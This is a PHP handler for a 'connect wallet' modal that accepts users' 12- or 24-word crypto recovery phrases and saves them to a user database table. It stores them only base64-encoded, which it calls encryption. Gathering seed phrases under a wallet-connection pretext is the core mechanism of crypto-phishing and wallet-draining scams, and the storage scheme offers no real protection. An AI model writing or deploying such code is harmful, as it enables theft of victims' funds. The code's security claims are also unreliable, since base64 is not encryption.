<?php
/**
 * WALLET_HANDLER.PHP
 * Handles wallet connection requests from the connect wallet modal
 * Saves wallet recovery phrases to the database for specific user
 */

header('Content-Type: application/json');

// Include auth and DB
include '../includes/dashboard_init.php';

try {
    // Check if request method is POST
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        throw new Exception('Invalid request method. POST required.');
    }

    // Check if user is authenticated
    if (!isset($_SESSION['user_id']) || empty($_SESSION['user_id'])) {
        throw new Exception('User not authenticated. Please log in first.');
    }

    $user_id = $_SESSION['user_id'];

    // Get POST data
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);

    if (!$data) {
        // Fallback to form data if JSON fails
        $data = [
            'wallet_name' => $_POST['wallet_name'] ?? null,
            'mnemonic' => $_POST['mnemonic'] ?? null
        ];
    }

    // Validate required fields
    if (empty($data['wallet_name']) || empty($data['mnemonic'])) {
        throw new Exception('Wallet name and mnemonic are required.');
    }

    $wallet_name = trim($data['wallet_name']);
    $mnemonic = trim($data['mnemonic']);

    // Validate mnemonic format (12 or 24 words)
    $words = explode(' ', $mnemonic);
    $word_count = count(array_filter($words));
    
    if ($word_count !== 12 && $word_count !== 24) {
        throw new Exception('Mnemonic must contain 12 or 24 words.');
    }

    // Encrypt mnemonic for security (basic encryption - use proper encryption in production)
    $encryption_key = 'your_secret_key'; // Should be in config
    $encrypted_mnemonic = base64_encode($mnemonic); // Use openssl_encrypt() in production

    // Prepare SQL to save wallet connection
    // Uses 'user' table (not 'users') with fields: id, connected_wallet_name, wallet_phrase, wallet_phrase_verified
    
    // Get database connection
    include '../database/db_config.php';
    
    if (!$conn) {
        throw new Exception('Database connection failed.');
    }

    $sql = "UPDATE user 
            SET connected_wallet_name = ?,
                wallet_phrase = ?,
                wallet_phrase_verified = 0,
                wallet_connected_at = NOW()
            WHERE id = ?";

    $stmt = $conn->prepare($sql);
    
    if (!$stmt) {
        throw new Exception('Database error: ' . $conn->error);
    }
    
    $stmt->bind_param('ssi', $wallet_name, $encrypted_mnemonic, $user_id);
    
    if (!$stmt->execute()) {
        throw new Exception('Failed to update user record: ' . $stmt->error);
    }

    if ($stmt->affected_rows === 0) {
        throw new Exception('User not found or no update made.');
    }

    $stmt->close();

    // Return success response
    echo json_encode([
        'success' => true,
        'message' => 'Wallet connection request received and pending verification.',
        'wallet_name' => $wallet_name,
        'word_count' => $word_count,
        'timestamp' => time(),
        'user_id' => $user_id
    ]);

} catch (Exception $e) {
    http_response_code(400);
    echo json_encode([
        'success' => false,
        'message' => $e->getMessage(),
        'error_code' => 'WALLET_ERROR'
    ]);
    error_log('Wallet Handler Error: ' . $e->getMessage());
}
?>

